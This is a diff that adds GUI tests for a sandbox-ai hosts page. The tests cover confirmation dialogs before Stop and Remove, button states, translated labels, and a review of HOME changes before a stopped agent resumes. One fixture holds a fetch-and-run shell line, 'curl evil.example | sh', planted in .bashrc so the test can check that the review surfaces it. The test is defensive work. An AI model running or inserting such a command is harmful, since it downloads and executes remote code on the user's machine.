@@ -179,3 +179,97 @@ def test_a_chosen_host_never_shows_another_hosts_starts(qapp, env, monkeypatch):
     assert page.starts.item(0, 0).text() == "there"
     page.close()
     assert not page.timer.isActive()
+
+
+def test_stop_and_remove_ask_first_naming_the_host_and_the_start(qapp, env, monkeypatch):
+    """Regression: Stop and Remove host acted at one click. Both ask now (Cancel is the default), naming the host and
+    the start."""
+    sai = backend.SandboxAI()
+    if not sai.hosts_supported():
+        pytest.skip("this sandbox-ai has no hosts.py")
+    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
+    asked = []
+    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
+               "started": "x"}]
+
+    def host_run(name, *args, timeout=120):
+        asked.append((name, args))
+        return 0, json.dumps(starts if args[0] == "list" else [] if args[0] == "approvals" else {}), ""
+    monkeypatch.setattr(sai, "host_run", host_run)
+    monkeypatch.setattr(widgets, "SHOWN", [])
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)  # Cancel
+    page = HostsPage(sai, lambda argv, title: None)
+    page.list.setCurrentRow(1)
+    page.show()
+    page.starts.selectRow(0)
+    page.start_action("stop")
+    title, text, _ = widgets.SHOWN[-1]
+    assert title == "Stop" and "ct1" in text and "web" in text
+    assert ("ct1", ("stop", "web")) not in asked
+    page.remove()
+    title, text, _ = widgets.SHOWN[-1]
+    assert title == "Remove host" and "ct1" in text
+    assert [e["name"] for e in sai.host_entries()] == ["local", "ct1"], "declined: still listed"
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.start_action("stop")
+    assert ("ct1", ("stop", "web")) in asked
+    page.close()
+
+
+def test_the_starts_buttons_follow_the_state_and_the_selection_stays_across_a_refresh(qapp, env, monkeypatch):
+    from sandbox_ai_app import i18n
+    sai = backend.SandboxAI()
+    if not sai.hosts_supported():
+        pytest.skip("this sandbox-ai has no hosts.py")
+    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
+    asked = []
+    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
+               "started": "x"},
+              {"name": "old", "agent": "codex", "state": "stopped", "workspace": "/srv/old", "started": "y"}]
+    review = {"name": "old", "state": "stopped", "pending": True,
+              "review": {"since": "2026-11-07T10:00:00Z", "complete": True,
+                         "changes": [{"path": ".bashrc", "change": "changed", "diff": "+curl evil.example | sh"}]}}
+
+    def host_run(name, *args, timeout=120):
+        asked.append((name, args))
+        if args[0] == "list":
+            return 0, json.dumps(starts), ""
+        if args[:2] == ("resume", "old") and "--review-home" in args:
+            return 0, json.dumps(review), ""
+        return 0, json.dumps([] if args[0] == "approvals" else {}), ""
+    monkeypatch.setattr(sai, "host_run", host_run)
+    monkeypatch.setattr(widgets, "SHOWN", [])
+    i18n.set_language("de")
+    page = HostsPage(sai, lambda argv, title: None)
+    page.list.setCurrentRow(1)
+    page.show()
+    states = [page.starts.item(r, 2).text() for r in range(2)]
+    assert states == [i18n.tr("running"), i18n.tr("stopped")] and "gestoppt" in states, "the states are translated"
+    i18n.set_language("en")
+    page.starts.selectRow(1)
+    enabled = {action: button.isEnabled() for action, button in page.action_buttons.items()}
+    assert enabled == {"pause": False, "resume": True, "stop": False} and not page.attach_button.isEnabled()
+    starts.reverse()  # read again (every 20 s): another order; the selection stays on its start
+    page.refresh_host(quiet=True)
+    assert page.chosen_start()["name"] == "old" and page.action_buttons["resume"].isEnabled()
+    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "web"][0])
+    assert page.action_buttons["pause"].isEnabled() and page.attach_button.isEnabled()
+    assert not page.action_buttons["resume"].isEnabled()
+    # Resuming a stopped kept start: what changed in its HOME first.
+    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "old"][0])
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)
+    page.start_action("resume")
+    title, text, details = widgets.SHOWN[-1]
+    assert title == "Resume old on ct1" and ".bashrc" in text and "evil.example" in details
+    assert ("ct1", ("resume", "old")) not in asked
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.start_action("resume")
+    assert ("ct1", ("resume", "old")) in asked
+    page.close()
+
+
+def test_update_all_counts_the_hosts_as_everything_else_does(qapp, env, monkeypatch):
+    """Update all took the hosts of kind "ssh" only; every other place counts each host but this machine."""
+    from sandbox_ai_app import hosts_page
+    assert hosts_page.is_remote({"name": "ct1", "kind": "ssh"}) and hosts_page.is_remote({"name": "ct2", "kind": "lxc"})
+    assert not hosts_page.is_remote({"name": "local", "kind": "local"}) and not hosts_page.is_remote({"name": "local"})
